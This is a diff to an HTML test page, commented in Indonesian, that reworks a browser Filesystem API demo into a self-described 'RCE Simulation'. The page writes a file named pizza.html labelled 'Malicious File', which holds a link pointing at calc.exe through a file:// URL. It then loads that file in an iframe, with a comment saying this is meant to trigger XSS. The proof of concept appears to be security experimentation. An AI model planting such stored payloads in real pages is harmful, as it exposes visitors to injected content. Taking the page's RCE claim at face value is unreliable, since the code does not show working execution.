@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Filesystem API Test</title>
+    <title>Filesystem API Test with RCE Simulation</title>
     <script>
         function createFile() {
             // Ukuran storage yang diminta (1MB)
@@ -13,17 +13,29 @@
             window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
                 console.log("Filesystem berhasil diakses:", fs);
 
-                // Buat file "test.html"
+                // Buat file "pizza.html"
                 fs.root.getFile("pizza.html", { create: true, exclusive: false }, function(fileEntry) {
                     console.log("File berhasil dibuat:", fileEntry.toURL());
 
                     // Buat writer untuk menulis ke file
                     fileEntry.createWriter(function(fileWriter) {
-                        // Pastikan HTML dibungkus dalam string yang benar
-                        let blob = new Blob([`<meta http-equiv="refresh" content="0;url=https://google.com/">`], { type: "text/html" });
+                        // Simulasi RCE menggunakan href untuk ngerestart kalkulator
+                        let blob = new Blob([`
+                            <html>
+                            <body>
+                                <h1>Malicious File</h1>
+                                <p>If you click below, it will trigger an action.</p>
+                                <a href="javascript:void(0);" onclick="window.location='file://C:/Windows/System32/calc.exe';">Click to open Calculator</a>
+                            </body>
+                            </html>
+                        `], { type: "text/html" });
 
                         fileWriter.onwriteend = function() {
                             console.log("File berhasil ditulis:", fileEntry.toURL());
+                            // Load file yang sudah kita buat tadi ke dalam iframe untuk trigger XSS
+                            let iframe = document.createElement("iframe");
+                            iframe.src = fileEntry.toURL();
+                            document.body.appendChild(iframe);
                         };
 
                         fileWriter.onerror = function(err) {
@@ -47,8 +59,8 @@
     </script>
 </head>
 <body>
-    <h1>Filesystem API Test</h1>
-    <p>This page is attempting to use the Filesystem API to create a file.</p>
+    <h1>Filesystem API Test with RCE Simulation</h1>
+    <p>This page is attempting to use the Filesystem API to create a file with malicious content.</p>
     <iframe src="https://policies.google.com/terms?hl=en"></iframe>
 </body>
 </html>
